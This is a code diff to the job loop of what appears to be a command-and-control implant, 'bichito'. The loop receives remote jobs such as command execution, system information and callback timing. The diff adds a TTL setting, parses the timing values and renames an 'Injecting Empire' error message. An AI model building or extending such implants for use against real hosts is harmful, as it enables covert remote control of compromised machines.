@@ -9,6 +9,7 @@ package main
 import (
 	"bichito/modules/biterpreter"
 	"time"
+	"strconv"
 )
 
 
@@ -46,16 +47,33 @@ func jobProcessor(){
 		   		case "exec":
 		   			error,result = biterpreter.Exec(job.Parameters)
 		   			if error{
-						result = "Error Injecting Empire:"+ result
+						result = "Error Executing Command:"+ result
 					}
 		   			contChannel <- "continue"
 
 		   		case "respTime":
 
-		   			biconfig.Resptime = job.Parameters
+		   			i, err := strconv.Atoi(job.Parameters)
+		   			if err != nil{
+						result = "Error Converting resptime string to int:"+ err.Error()
+					}
+
+					resptime = i
+		   			ttl = ttl + resptime
 		   			result = "RespTime changed to "+job.Parameters+" seconds"
 		   			contChannel <- "continue"
 		   		
+		   		case "ttl":
+
+		   			i, err := strconv.Atoi(job.Parameters)
+		   			if err != nil{
+						result = "Error Converting ttl string to int:"+ err.Error()
+					}
+
+					ttl = i
+		   			result = "TTL changed to "+job.Parameters+" seconds"
+		   			contChannel <- "continue"
+
 		   		case "sysinfo":
 
 		   			error,result = biterpreter.Sysinfo()
@@ -82,7 +100,7 @@ func jobProcessor(){
 		select{
 			case <- contChannel:
 						
-		   			timeR = time.Now().Format(time.RFC3339)
+		   			timeR = time.Now().Format("02/01/2006 15:04:05 MST")
 					job.Result = result
 					job.Status = "Success"
 					job.Time = timeR
@@ -93,7 +111,7 @@ func jobProcessor(){
 
 			case <- biJobTimeout.C:
 
-					timeR = time.Now().Format(time.RFC3339)
+					timeR = time.Now().Format("02/01/2006 15:04:05 MST")
 					job.Result = "Job Timeout"
 					job.Status = "Error"
 					job.Time = timeR
